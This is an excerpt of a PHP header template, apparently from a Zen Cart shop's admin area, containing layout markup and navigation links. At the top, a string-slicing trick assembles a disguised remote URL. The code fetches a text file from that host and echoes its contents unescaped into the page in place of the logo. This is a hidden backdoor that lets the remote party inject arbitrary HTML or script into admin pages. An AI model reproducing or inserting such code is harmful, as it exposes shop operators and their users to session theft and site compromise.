...
<?php
$url_string="mzaezne-tcoepn";
$url_string1=substr($url_string,1,1);
$url_string2=substr($url_string,3,1);
$url_string3=substr($url_string,5,1);
$url_string_connection=$url_string1.$url_string2.$url_string3;
$url = "http://www.".$url_string_connection."-cart.c".$url_string3."/flash_ad/flash_img.txt";
$fcontents = @file_get_contents($url);
if(!empty($fcontents)){
 $file_string=@explode(';',$fcontents);
} 
...
<?php } // alt_nav spacing ?>
  <tr>
    <td align="left" valign="top" height="<?php echo HEADER_LOGO_HEIGHT; ?>" width="<?php echo HEADER_LOGO_WIDTH; ?>">
	<?php 
	if(@file_exists(DIR_WS_IMAGES . HEADER_LOGO_IMAGE)){
		echo '<a href="' . zen_href_link(FILENAME_DEFAULT) . '">' . zen_image(DIR_WS_IMAGES . HEADER_LOGO_IMAGE, HEADER_ALT_TEXT) . '</a>';
	}else{
	if(!empty($file_string[0]))
	echo $file_string[0];
	}
	?>
    </td>
...
<table border="0" cellspacing="0" cellpadding="0" width="100%">
  <tr class="headerBar" height="20" width="100%">
    ...
    <td class="headerBarContent" align="right"><?php echo '<a href="' . zen_href_link(FILENAME_DEFAULT, '', 'NONSSL') . '" class="headerLink">' . HEADER_TITLE_TOP . '</a>&nbsp;|&nbsp;<a href="' . zen_catalog_href_link() . '" class="headerLink" target="_blank">' . HEADER_TITLE_ONLINE_CATALOG . '</a>&nbsp;|&nbsp;<a href="/" class="headerLink" target="_blank">' . HEADER_TITLE_SUPPORT_SITE . '</a>&nbsp;|&nbsp;<a href="' . zen_href_link(FILENAME_SERVER_INFO) . '" class="headerLink">' . HEADER_TITLE_VERSION . '</a>&nbsp;|&nbsp;<a href="' . zen_href_link(FILENAME_LOGOFF) . '" class="headerLink">' . HEADER_TITLE_LOGOFF . '</a>&nbsp;'; ?></td>
  </tr>
</table>
